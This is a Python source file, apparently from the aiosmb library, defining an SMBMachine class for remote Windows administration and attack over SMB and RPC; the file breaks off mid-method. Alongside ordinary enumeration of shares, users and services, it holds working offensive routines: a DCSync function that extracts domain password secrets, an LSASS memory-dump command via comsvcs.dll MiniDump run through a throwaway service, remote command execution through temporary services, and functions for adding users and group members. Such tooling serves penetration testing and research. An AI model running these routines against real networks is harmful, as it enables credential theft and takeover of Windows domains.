
import asyncio
import ntpath
import os
from datetime import datetime, timezone, timedelta
from typing import Callable, Awaitable, List, Dict, AsyncGenerator, Tuple, Union

from aiosmb import logger
from aiosmb.commons.interfaces.share import SMBShare
from aiosmb.commons.interfaces.session import SMBUserSession
from aiosmb.commons.interfaces.file import SMBFile
from aiosmb.commons.interfaces.directory import SMBDirectory
from aiosmb.commons.utils.cpasswd import find_cpasswd

from aiosmb.dcerpc.v5.interfaces.srvsmgr import SRVSRPC, srvsrpc_from_smb
from aiosmb.dcerpc.v5.interfaces.samrmgr import SAMRRPC, samrrpc_from_smb
from aiosmb.dcerpc.v5.interfaces.lsatmgr import LSADRPC, lsadrpc_from_smb
from aiosmb.dcerpc.v5.interfaces.drsuapimgr import drsuapirpc_from_smb
from aiosmb.dcerpc.v5.interfaces.servicemanager import REMSVCRPC, remsvcrpc_from_smb
from aiosmb.dcerpc.v5.interfaces.remoteregistry import RRPRPC, rrprpc_from_smb
from aiosmb.dcerpc.v5.interfaces.rprnmgr import RPRNRPC, rprnrpc_from_smb
from aiosmb.dcerpc.v5.interfaces.tschmgr import TSCHRPC, tschrpc_from_smb
from aiosmb.dcerpc.v5.interfaces.parmgr import PARRPC, parrpc_from_smb
from aiosmb.dcerpc.v5.interfaces.wkstmgr import WKSTRPC, wkstrpc_from_smb
from aiosmb.dcerpc.v5.interfaces.atsvcmgr import atsvcrpc_from_smb
from aiosmb.dcerpc.v5.dtypes import RPC_SID
from aiosmb.dcerpc.v5.common.secrets import SMBUserSecrets
from aiosmb.dcerpc.v5.common.service import SMBService, ServiceStatus
from aiosmb.connection import SMBConnection
from aiosmb.dcerpc.v5.dcom.wmi import IWbemServices, CLSID_WbemLevel1Login, IID_IWbemLevel1Login, IWbemLevel1Login
from aiosmb.dcerpc.v5.dtypes import NULL
from aiosmb.dcerpc.v5.dcom.connection import DCOMConnection
from aiosmb.dcerpc.v5.dcom.wmiutils.shadowcopy import wmi_create_shadow_copy, wmi_delete_shadow_copy
from aiosmb.dcerpc.v5.dcom.wmiutils.cmdexec import wmi_cmd_exec
from aiosmb.dcerpc.v5.dcom.mmc import MMC20Application, CLSID_MMC20, IID_IDispatch
from aiosmb.dcerpc.v5.dcom.shellwindows import ShellWindows, CLSID_ShellWindows, ShellBrowserWindow, CLSID_ShellBrowserWindow, CLSID_ShellWindows
from aiosmb.dcerpc.v5.dcom.certreq import ICertRequestD, CLSID_ICertRequest, IID_ICertRequestD
from aiosmb.dcerpc.v5.dcom.certadmin import (
	ICertAdminD2, CLSID_ICertAdmin, IID_ICertAdminD2,
	ICertAdminD, CLSID_ICertAdminD, IID_ICertAdminD,
)
from aiosmb.dcerpc.v5.interfaces.icprmgr import ICPRRPC

from aiosmb.dcerpc.v5 import tsch, scmr

from aiosmb.protocol.smb2.commands.ioctl import CtlCode, IOCTLREQFlags

from aiosmb.dcerpc.v5.rprn import PRINTER_CHANGE_ADD_JOB
from contextlib import asynccontextmanager


class SMBMachine:
	def __init__(self, connection, print_cb = None, force_rpc_auth = None):
		self.connection:SMBConnection = connection
		self.print_cb = print_cb
		self.force_rpc_auth = force_rpc_auth
		self.sessions = []

	async def __aenter__(self):
		return self
		
	async def __aexit__(self, exc_type, exc, traceback):
		try:
			await asyncio.wait_for(self.close(), timeout = 5)
		except:
			pass

	async def close(self):
		return

	@asynccontextmanager
	async def connect_rpc(self, servce_obj, auth_level=None, open=True, perform_dummy=False):
		instance, err = await servce_obj.from_smbconnection(self.connection, auth_level, open, perform_dummy)
		if err:
			raise err
		try:
			yield instance
		finally:
			await instance.close()
	
	async def list_pipes(self) -> AsyncGenerator[Tuple[str, Union[Exception, None]], None]:
		try:
			async for share, err in self.list_shares():
				if err is not None:
					pass
				if share.name.upper() == 'IPC$':
					_, err = await share.connect(self.connection)
					if err is not None:
						raise err
					async for entry, entrytype, err in share.subdirs[''].list_r(self.connection, depth = 1, maxentries = 100):
						if entrytype == 'file':
							yield entry.name, None
		except Exception as e:
			yield None, e
	
	async def list_shares(self, fetch_share_sd:bool = False) -> AsyncGenerator[Tuple[SMBShare, Union[Exception, None]], None]:
		try:
			async with srvsrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				async for name, share_type, remark, err in rpc.list_shares():
					if err is not None:
						yield None, err
						return
					share = SMBShare(
						name = name, 
						stype = share_type, 
						remark = remark, 
						fullpath = '\\\\%s\\%s' % (self.connection.target.get_hostname_or_ip(), name)
					)
					if fetch_share_sd is True:
						await share.get_security_descriptor(self.connection)
		
					yield share, None
		except Exception as e:
			yield None, e

	async def list_sessions(self, level:int = 10) -> AsyncGenerator[Tuple[SMBUserSession, Union[Exception, None]], None]:
		try:
			async with srvsrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				async for username, ip_addr, err in rpc.list_sessions(level = level):
					if err is not None:
						yield None, err
						return
					sess = SMBUserSession(username = username, ip_addr = ip_addr.replace('\\','').strip())
					self.sessions.append(sess)
					yield sess, None
		except Exception as e:
			yield None, e

	async def wkstlist_sessions(self, level:int = 1) -> AsyncGenerator[Tuple[SMBUserSession, Union[Exception, None]], None]:
		try:
			async with wkstrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				async for username, ip_addr, err in rpc.list_sessions(level = level):
					if err is not None:
						yield None, err
						return
					sess = SMBUserSession(username = username)
					self.sessions.append(sess)
					yield sess, None
		except Exception as e:
			yield None, e

	async def list_domains(self) -> AsyncGenerator[Tuple[str, Union[Exception, None]], None]:
		try:
			async with samrrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				async for domain, err in rpc.list_domains():
					yield domain, err
		except Exception as e:
			yield None, e
	
	async def list_localgroups(self) -> AsyncGenerator[Tuple[str, str, Union[Exception, None]], None]:
		try:
			async for name, sid, err in self.list_groups('Builtin'):
				yield name, sid, err
		except Exception as e:
			yield None, None, e

	async def list_groups(self, domain_name:str, ret_sid:bool = True) -> AsyncGenerator[Tuple[str, str, Union[Exception, None]], None]:
		"""
		Lists all groups in a given domain.
		domain_name: string
		"""
		try:
			async with samrrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				domain_sid, err = await rpc.get_domain_sid(domain_name)
				if err is not None:
					raise err
				domain_handle, err = await rpc.open_domain(domain_sid)
				if err is not None:
					raise err
				async for name, rid, err in rpc.list_aliases(domain_handle):
					if err is not None:
						raise err
					sid = '%s-%s' % (domain_sid, rid)
					yield name, sid, None
		
		except Exception as e:
			yield None, None, e

	async def list_group_members(self, domain_name:str, group_name:str) -> AsyncGenerator[Tuple[str, str, str, Union[Exception, None]], None]:
		try:
			async with samrrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as samrpc:
				async with lsadrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as lsadrpc:
					policy_handle, err = await lsadrpc.open_policy2()
					if err is not None:
						raise err
					domain_sid, err = await samrpc.get_domain_sid(domain_name)
					if err is not None:
						raise err
					domain_handle, err = await samrpc.open_domain(domain_sid)
					if err is not None:
						raise err
					target_group_rid = None
					async for name, rid, err in samrpc.list_aliases(domain_handle):
						if err is not None:
							raise err
						if name == group_name:
							target_group_rid = rid
							break

					if target_group_rid is None:
						raise Exception('No group found with name "%s"' % group_name)
					
					alias_handle, err = await samrpc.open_alias(domain_handle, target_group_rid)
					if err is not None:
						raise err

					async for sid, err in samrpc.list_alias_members(alias_handle):
						if err is not None:
							raise err
						
						async for domain_name, user_name, err in lsadrpc.lookup_sids(policy_handle, [sid]):
							if err is not None:
								raise err
							yield domain_name, user_name, sid, None
		
		except Exception as e:
			yield None, None, None, e

	async def add_new_user(self, domain_name:str, user_name:str, password:str):
		try:
			async with samrrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as samrpc:
				if domain_name is None or domain_name == '' or domain_name == 'Builtin':
					dhandle, err = await samrpc.openBuiltinDomain()
				else:
					dhandle, err = await samrpc.open_domain_by_name(domain_name)
				if err is not None:
					raise err
				
				_, err = await samrpc.create_user(dhandle, user_name, password)
				if err is not None:
					raise err
				return True, None

		except Exception as e:
			return None, e
	
	async def enable_user(self, domain_name:str, user_name:str) -> Awaitable[Tuple[str, Union[Exception, None]]]:
		try:
			async with samrrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as samrpc:
				async with samrpc.get_user_handle(domain_name, user_name) as uhandle:
					return await samrpc.enable_account(uhandle)

		except Exception as e:
			return None, e

	async def disable_user(self, domain_name:str, user_name:str) -> Awaitable[Tuple[str, Union[Exception, None]]]:
		try:
			async with samrrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as samrpc:
				async with samrpc.get_user_handle(domain_name, user_name) as uhandle:
					return await samrpc.disable_account(uhandle)
		except Exception as e:
			return None, e
	
	async def delete_user(self, domain_name:str, user_name:str) -> Awaitable[Tuple[str, Union[Exception, None]]]:
		try:
			async with samrrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as samrpc:
				async with samrpc.get_user_handle(domain_name, user_name) as uhandle:
					return await samrpc.disable_account(uhandle)

		except Exception as e:
			return None, e

	async def change_user_password(self, domain_name:str, user_name:str, old_password:str, new_password:str) -> Awaitable[Tuple[str, Union[Exception, None]]]:
		try:
			async with samrrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as samrpc:
				async with samrpc.get_user_handle(domain_name, user_name) as uhandle:
					return await samrpc.change_account_password(uhandle, old_password, new_password)

		except Exception as e:
			return None, e

	async def change_user_password_nt(self, domain_name:str, user_name:str, old_pw_hash:str, new_password:str) -> Awaitable[Tuple[str, Union[Exception, None]]]:
		try:
			async with samrrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as samrpc:
				async with samrpc.get_user_handle(domain_name, user_name) as uhandle:
					return await samrpc.change_account_password_nt(uhandle, old_pw_hash, new_password)

		except Exception as e:
			return None, e
	
	async def change_user_password_new(self, domain_name:str, user_name:str, new_password:str) -> Awaitable[Tuple[str, Union[Exception, None]]]:
		try:
			async with samrrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as samrpc:
				async with samrpc.get_user_handle(domain_name, user_name) as uhandle:
					return await samrpc.change_account_password_4(uhandle, new_password)

		except Exception as e:
			return None, e


	async def change_user_password_internal(self, domain_name:str, user_name:str, new_password:str) -> Awaitable[Tuple[str, Union[Exception, None]]]:
		try:
			async with samrrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as samrpc:
				async with samrpc.get_user_handle(domain_name, user_name) as uhandle:
					return await samrpc.change_account_password_internal(uhandle, new_password)

		except Exception as e:
			return None, e
	
	async def list_users_allowed_to_replicate(self, domain_name:str):
		try:
			async with samrrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as samrpc:
				async for name, sid, rid, err in samrpc.list_users_allowed_to_replicate(domain_name):
					yield name, sid, rid, err
		except Exception as e:
			yield None, None, None, err
			

	async def add_sid_to_group(self, domain_name:str, group_name:str, sid:str) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		try:
			async with samrrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as samrpc:
				async with lsadrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as lsadrpc:
					policy_handle, err = await lsadrpc.open_policy2()
					if err is not None:
						raise err
					domain_sid, err = await samrpc.get_domain_sid(domain_name)
					if err is not None:
						raise err
					domain_handle, err = await samrpc.open_domain(domain_sid)
					if err is not None:
						raise err
					target_group_rid = None
					async for name, rid, err in samrpc.list_aliases(domain_handle):
						if err is not None:
							raise err

						if name == group_name:
							target_group_rid = rid
							break

					if target_group_rid is None:
						raise Exception('No group found with name "%s"' % group_name)
					
					alias_handle, err = await samrpc.open_alias(domain_handle, target_group_rid)
					if err is not None:
						raise err
					targetsid = RPC_SID()
					targetsid.fromCanonical(sid)
					result, err = await samrpc.add_member_to_alias(alias_handle, targetsid)
					if err is not None:
						raise err
					return result, None
		except Exception as e:
			return False, e		

	async def list_directory(self, directory:SMBDirectory) -> AsyncGenerator[Tuple[str, Union[Exception, None]], None]:
		_, err = await directory.list(self.connection)
		if err is not None:
			yield None, err
			return
		
		for entry in directory.get_console_output():
			yield entry, None

	async def enum_all_recursively(self, depth:int = 3, maxentries:int = None, exclude_share:List[str]=['print$', 'PRINT$'], exclude_dir:List[str]=[], fetch_share_sd:bool = False, fetch_dir_sd:bool = False, fetch_file_sd:bool = False) -> AsyncGenerator[Tuple[Union[SMBShare, SMBDirectory, SMBFile], str, Union[Exception, None]], None]:
		if exclude_share is None:
			exclude_share = []
		if exclude_dir is None:
			exclude_dir = []
		
		shares:Dict[str, SMBShare] = {}
		async for share, err in self.list_shares(fetch_share_sd):
			if err is not None:
				raise err
			if share.name.upper() == 'IPC$':
				continue
			shares[share.name] = share
			yield share, 'share', None

		for share_name in shares:
			if share_name in exclude_share:
				continue

			_, err = await shares[share_name].connect(self.connection)
			if err is not None:
				continue
				raise err

			async for entry in shares[share_name].subdirs[''].list_r(self.connection, depth = depth, maxentries = maxentries, fetch_dir_sd = fetch_dir_sd, fetch_file_sd = fetch_file_sd, exclude_dir = exclude_dir):
				yield entry
				await asyncio.sleep(0)
	
	async def enum_files_with_filter(self, filter_cb:Callable[[str, str], Awaitable[bool]], depth:int = 1000) -> AsyncGenerator[Tuple[Union[SMBShare, SMBDirectory, SMBFile], str, Union[Exception, None]], None]:
		shares:Dict[str, SMBShare] = {}
		async for share, err in self.list_shares():
			if err is not None:
				raise err
			shares[share.name] = share
			yield share, 'share', None

		for share_name in shares:
			res = await filter_cb('sharename', share_name)
			if res is False:
				continue

			_, err = await shares[share_name].connect(self.connection)
			if err is not None:
				continue
			
			res = await filter_cb('share', shares[share_name])
			if res is False:
				continue

			async for entry in shares[share_name].subdirs[''].list_r(self.connection, depth = depth, maxentries = -1, filter_cb = filter_cb):
				yield entry
				await asyncio.sleep(0)

	async def put_file(self, local_path:str, remote_path: str) -> Awaitable[Tuple[int, Union[Exception, None]]]:
		"""
		remote_path must be a full UNC path with the file name included!

		"""
		try:
			smbfile = SMBFile.from_remotepath(self.connection, remote_path)
			_, err = await smbfile.open(self.connection, 'w')
			if err is not None:
				return False, err

			with open(local_path, 'rb') as f:
				total_writen, err = await smbfile.write_buffer(f)

			await smbfile.close()
			return total_writen, None
		except Exception as e:
			return False, e

	async def get_file(self, out_path:str, file_obj:SMBFile):
		# TODO: add typehint
		with open(out_path, 'wb') as f:
			try:
				await file_obj.open(self.connection, 'r')
				while True:
					data = await file_obj.read(1024)
					if not data:
						break
					f.write(data)
			finally:
				await file_obj.close()
	
	async def get_directory(self, out_path:str, dir_obj:SMBDirectory):
		async for entry in dir_obj.list_r(self.connection, depth = 1000, maxentries = -1):
			if entry.is_directory is True:
				# normalize entry.name os independent way
				dirname = ntpath.normpath(entry.name)
				os.makedirs(os.path.join(out_path, dirname), exist_ok=True)
				await self.get_directory(os.path.join(out_path, dirname), entry)
			await self.get_file(os.path.join(out_path, entry.name), entry)

	async def get_file_data(self, file_obj:SMBFile) -> AsyncGenerator[Tuple[bytes, Union[Exception, None]], None]:
		_, err = await file_obj.open(self.connection, 'r')
		if err is not None:
			yield None, err
			return
		async for data, err in file_obj.read_chunked():
			yield data, err

	async def del_file(self, file_path:str) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		return await SMBFile.delete_rempath(self.connection, file_path)
	
	async def del_directory_path(self, dir_path:str) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		return await SMBDirectory.delete_unc(self.connection, dir_path)

	async def create_subdirectory(self, directory_name:str, parent_directory_obj:SMBDirectory) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		return await parent_directory_obj.create_subdir(directory_name, self.connection)
		

	async def list_services(self, with_config:bool = False) -> AsyncGenerator[Tuple[SMBService, Union[Exception, None]], None]:
		try:
			async with remsvcrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:	
				async for service, err in rpc.list(with_config=with_config):
					if err is not None:
						raise err
					yield service, None
		
		except Exception as e:
			yield None, e

	async def get_service_config(self, service_name:str) -> Awaitable[Tuple[ServiceStatus, Union[Exception, None]]]:
		try:
			async with remsvcrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.get_config(service_name)
		except Exception as e:
			return None, e

	async def enable_service(self, service_name:str) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		try:
			async with remsvcrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				res, exc = await rpc.enable_service(service_name)
				return res, exc
		except Exception as e:
			return None, e

	async def list_domain_users(self, target_domain:str = None) -> AsyncGenerator[Tuple[str,str, Union[Exception, None]], None]:
		try:
			async with samrrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				if target_domain is None:
					logger.debug('No domain defined, fetching it from SAMR')
							
									
					logger.debug('Fetching domains...')
					async for domain, err in rpc.list_domains():
						if err is not None:
							raise err

						if domain == 'Builtin':
							continue
						if target_domain is None: #using th first available
							target_domain = domain
							logger.debug('Domain available: %s' % domain)

				domain_sid, err = await rpc.get_domain_sid(target_domain)
				if err is not None:
					raise err
				domain_handle, err = await rpc.open_domain(domain_sid)
				if err is not None:
					raise err
				
				async for username, user_sid, err in rpc.list_domain_users(domain_handle):
					yield username, user_sid, err
		
		except Exception as e:
			yield None, None, e

	async def dcsync(self, target_domain:str = None, target_users:List[str] = []) -> AsyncGenerator[Tuple[SMBUserSecrets, Union[Exception, None]], None]:
		try:
			if isinstance(target_users, str):
				target_users = [target_users]
			
			async with samrrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as samrpc:
				if target_domain is None or target_domain == '':
					if self.print_cb is not None:
						await self.print_cb('No domain defined, fetching it from SAMR')
					else:
						logger.debug('No domain defined, fetching it from SAMR')
					
					logger.debug('Fetching domains...')
					available_domains = []
					async for domain, err in samrpc.list_domains():
						if err is not None:
							raise err
						if domain == 'Builtin':
							continue
						#using th first available #if target_domain is None: 
						available_domains.append(domain)
						if self.print_cb is not None:
							await self.print_cb('Domain available: %s' % domain)
						else:
							logger.debug('Domain available: %s' % domain)

					target_domain = available_domains[0]
					if self.print_cb is not None:
						await self.print_cb('Selecting first available: %s' % available_domains[0])
					else:
						logger.debug('Selecting first available: %s' % available_domains[0])
				
				async with drsuapirpc_from_smb(self.connection, domain=target_domain, auth_level=self.force_rpc_auth) as drsuapi:
					#async with drsuapi:
					logger.debug('Using domain: %s' % target_domain)
					if len(target_users) > 0:
						# Resolve a bare sAMAccountName to a domain-scoped SID via SAMR (the
						# DC's OWN domain) before DRSUAPI. A bare name such as 'administrator'
						# or 'krbtgt' exists in every domain of a FOREST, so DsCrackNames on it
						# is ambiguous: DS_NT4_ACCOUNT_NAME_SANS_DOMAIN returns NOT_UNIQUE and
						# the DS_UNKNOWN_NAME fallback resolves the WRONG domain's object, so
						# DRSGetNCChanges returns 0 rows. SAMR is scoped to THIS DC's domain, so
						# the RID->SID it returns is always the correct local object. Mirrors the
						# full-replication branch below, which is already SID-based.
						_samr_sid = None
						_samr_handle = None
						try:
							_nb = None
							async for _d, _e in samrpc.list_domains():
								if _e is not None:
									break
								if _d == 'Builtin':
									continue
								_nb = _d
								break
							if _nb is not None:
								_samr_sid, _e = await samrpc.get_domain_sid(_nb)
								if _e is None and _samr_sid:
									_samr_handle, _e = await samrpc.open_domain(_samr_sid)
									if _e is not None:
										_samr_handle = None
						except Exception:
							_samr_sid = None
							_samr_handle = None
						for username in target_users:
							resolved = username
							_u = str(username or '')
							_qualified = ('@' in _u) or ('\\' in _u) or _u.upper().startswith('CN=') or ('S-1-5-' in _u.upper())
							if (not _qualified) and _samr_handle is not None and _samr_sid:
								_rid, _e = await samrpc.get_user_rid_by_name(_samr_handle, _u)
								if _e is None and _rid:
									resolved = '%s-%d' % (_samr_sid, int(_rid))
							secrets, err = await drsuapi.get_user_secrets(resolved)
							yield secrets, err
									
					else:
						
						domain_sid, err = await samrpc.get_domain_sid(target_domain)
						if err is not None:
							raise err
						logger.debug('domain_sid for %s: %s' % (target_domain, domain_sid))
						domain_handle, err = await samrpc.open_domain(domain_sid)
						if err is not None:
							raise err
						async for username, user_sid, err in samrpc.list_domain_users(domain_handle):
							if err is not None:
								yield None, err
								return
							#secrets, err = await drsuapi.get_user_secrets(username)
							secrets, err = await drsuapi.get_user_secrets(user_sid)
							if err is not None:
								yield None, err
								return
							yield secrets, None

		except Exception as e:
			yield None, e
			return

	
	async def get_regapi(self) -> Awaitable[Tuple[RRPRPC, Union[Exception, None]]]:
		try:
			instance, err = await RRPRPC.from_smbconnection(self.connection, auth_level=self.force_rpc_auth)
			if err is not None:
				raise err
			return instance, None
		except Exception as e:
			return None, e

	async def save_registry_hive(self, hive_name:str, remote_path:str) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		try:
			async with rrprpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				key_handle, err = await rpc.OpenRegPath(hive_name)
				if err is not None:
					return None, err
				res, err = await rpc.SaveKey(key_handle, remote_path)
				return res, err
		except Exception as e:
			return None, e

	async def reg_list_users(self) -> Awaitable[Tuple[List[str], Union[Exception, None]]]:
		"""
		Lists user SIDs available in the HKLM\\USERS hive
		"""
		try:
			async with rrprpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				users, err = await rpc.ListUsers()
				if err is not None:
					return None, err
				return users, err
		except Exception as e:
			return None, e
		
	
	async def service_dump_lsass(self, lsass_file_name:str = None, silent:bool = False) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		service_name = None
		try:
			async with remsvcrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:

				if lsass_file_name is None:
					lsass_file_name = os.urandom(4).hex() + '.arj'
				command = "powershell.exe -NoP -C \"%%windir%%\\System32\\rundll32.exe %%windir%%\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\%s full;Wait-Process -Id (Get-Process rundll32).id\"" % lsass_file_name
				service_name = os.urandom(4).hex()
				display_name = service_name

				batch_file = os.urandom(4).hex() + '.bat'
				#totally not from impacket
				command = '%%COMSPEC%% /Q /c echo %s  2^>^&1 > %s & %%COMSPEC%% /Q /c %s & del %s' % (command, batch_file, batch_file, batch_file)

				logger.debug('Service: %s' % service_name)
				logger.debug('Command: %s' % command)
				#return None, None
			
				res, err = await rpc.create_service(service_name, display_name, command, scmr.SERVICE_DEMAND_START)
				if err is not None:
					raise err
				
				if silent is False:
					if self.print_cb is not None:
						await self.print_cb('[%s] Service created with name: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
					else:
						logger.debug('Service created with name: %s' % service_name)
				
				_, err = await rpc.start_service(service_name)

				for _ in range(5):
					await asyncio.sleep(5)
					temp = SMBFile.from_remotepath(self.connection, '\\ADMIN$\\Temp\\%s' % lsass_file_name)
					_, err = await temp.open(self.connection)
					if err is not None:
						continue
					if silent is False:
						if self.print_cb is not None:
							await self.print_cb('[%s] Dump file is now accessible here: C:\\Windows\\Temp\\%s' % (self.connection.target.get_hostname_or_ip(), lsass_file_name))
						else:
							logger.debug('Dump file is now accessible on remote host')
					return temp, None

				return None, err
		except Exception as e:
			return None, e
		finally:
			if service_name is None:
				return
			_, err = await self.stop_service(service_name)
			_, err = await self.delete_service(service_name)
			if err is not None:
				logger.debug('Failed to delete service!')
				if silent is False:
					if self.print_cb is not None:
						await self.print_cb('[%s] Failed to remove service: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
					else:
						logger.debug('Failed to remove service: %s' % service_name)
			else:
				if silent is False:
					if self.print_cb is not None:
						await self.print_cb('[%s] Removed service: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
					else:
						logger.debug('Removed service: %s' % service_name)

	
	async def service_cmd_exec(self, command:str, display_name:str = None, service_name:str = None, result_wait_timeout:int = 1) -> AsyncGenerator[Tuple[bytes, Union[Exception, None]], None]:
		"""
		Creates a service and starts it.
		Does not create files! there is a separate command for that!
		"""
		
		try:
			async with remsvcrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as handle:
				if service_name is None:
					service_name = os.urandom(4).hex()
				if display_name is None:
					display_name = service_name

				batch_file = os.urandom(4).hex() + '.bat'
				temp_file_name = os.urandom(4).hex()
				temp_file_location = '\\ADMIN$\\temp\\%s' % temp_file_name
				temp_location = '%%windir%%\\temp\\%s' % (temp_file_name)

				#totally not from impacket
				command = '%%COMSPEC%% /Q /c echo %s  ^>  %s 2^>^&1 > %s & %%COMSPEC%% /Q /c %s & del %s' % (command, temp_location, batch_file, batch_file, batch_file)

				logger.debug('Command: %s' % command)

			
				res, err = await handle.create_service(service_name, display_name, command, scmr.SERVICE_DEMAND_START)
				if err is not None:
					raise err
				
				logger.debug('Service created. Name: %s' % service_name)
				
				_, err = await handle.start_service(service_name)
				#if err is not None:
				#	raise err

				err = None
				for _ in range(5):
					logger.debug('Opening temp file. Path: %s' % temp_file_location)
					temp = SMBFile.from_remotepath(self.connection, temp_file_location)
					_, err = await temp.open(self.connection)
					if err is not None:
						await asyncio.sleep(result_wait_timeout)
						continue
					break
				else:
					raise err

				async for data, err in temp.read_chunked():
					if err is not None:
						logger.debug('Temp file read failed!')
						raise err
					if data is None:
						break

					yield data, err
			
			logger.debug('Stopping service...')
			_, err = await self.stop_service(service_name)
			if err is not None:
				logger.debug('Failed to stop service!')

			logger.debug('Deleting service...')
			_, err = await self.delete_service(service_name)
			if err is not None:
				logger.warning('Failed to delete service!')

			logger.debug('Deleting temp file...')
			_, err = await temp.delete()
			if err is not None:
				logger.warning('Failed to delete temp file!')

			yield None, None

		except Exception as e:
			yield None, e
	
	async def create_service(self, service_name:str, command:str, display_name:str = None, starttype:int = scmr.SERVICE_AUTO_START) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		"""
		Creates a service and starts it.
		Does not create files! there is a separate command for that!
		"""
		try:
			async with remsvcrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				if display_name is None:
					display_name = service_name
				res, err = await rpc.create_service(service_name, display_name, command, starttype = starttype)
				return res, err
		except Exception as e:
			return None, e

	async def start_service(self, service_name:str) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		"""
		Creates a service and starts it.
		Does not create files! there is a separate command for that!
		"""
		try:
			async with remsvcrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.start_service(service_name)
		except Exception as e:
			return None, e
	
	async def stop_service(self, service_name:str) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		"""
		Creates a service and starts it.
		Does not create files! there is a separate command for that!
		"""
		try:
			async with remsvcrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.stop_service(service_name)
		except Exception as e:
			return None, e
	
	async def delete_service(self, service_name:str) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		"""
		Creates a service and starts it.
		Does not create files! there is a separate command for that!
		"""
		try:
			async with remsvcrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.delete_service(service_name)
		except Exception as e:
			return None, e
	
	async def get_service_config(self, service_name:str) -> Awaitable[Tuple[SMBService, Union[Exception, None]]]:
		"""
		Creates a service and starts it.
		Does not create files! there is a separate command for that!
		"""
		try:
			async with remsvcrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.get_config(service_name)
		except Exception as e:
			return None, e


	async def deploy_service(self, path_to_executable:str, remote_path:str = None, service_name:str = None) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		"""

		remote path must be UNC
		"""
		try:
			if service_name is None:
				service_name = os.urandom(4).hex()
			if remote_path is None:
				raise NotImplementedError()

			filename = ntpath.basename(path_to_executable)
			remote_file_path = remote_path + filename
			remote_file = SMBFile.from_uncpath(remote_file_path)
			await self.put_file(path_to_executable, remote_file)
			
			command = remote_file_path

			await self.create_service(service_name, command)

			return True, None
		except Exception as e:
			return None, e
	

	async def tasks_list(self) -> AsyncGenerator[Tuple[str, Union[Exception, None]], None]:
		"""
		Lists scheduled tasks
		"""
		try:
			async with tschrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				async for task, err in rpc.list_tasks():
					yield task, err
		except Exception as e:
			yield None, e
	
	async def get_task(self, task_name:str) -> Awaitable[Tuple[str, Union[Exception, None]]]:
		"""
		Returns task XML
		"""
		try:
			async with tschrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.get_task(task_name)
		except Exception as e:
			return None, e
	
	async def list_task_folders(self, path = '\\') -> AsyncGenerator[Tuple[str, Union[Exception, None]], None]:
		"""
		Lists task folders
		"""
		try:
			async with tschrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				async for folder, err in rpc.list_folders(path):
					yield folder, err
		except Exception as e:
			yield None, e

	async def tasks_register(self, template:str, task_name:str = None, flags:int = tsch.TASK_CREATE, sddl:str = None, logon_type:int = tsch.TASK_LOGON_NONE) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		"""
		Registers a new task
		"""
		try:
			async with tschrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.register_task(template, task_name = task_name, flags = flags, sddl = sddl, logon_type = logon_type)
		except Exception as e:
			return None, e


	async def tasks_execute_commands(self, commands) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		try:
			async with tschrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.run_commands(commands)
		except Exception as e:
			return None, e
	
	async def tasks_cmd_exec(self, command:str, result_wait_timeout:int = 1) -> AsyncGenerator[Tuple[bytes, Union[Exception, None]], None]:
		try:
			async with tschrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:

				temp_file_name = os.urandom(4).hex()
				temp_file_location = '\\ADMIN$\\temp\\%s' % temp_file_name
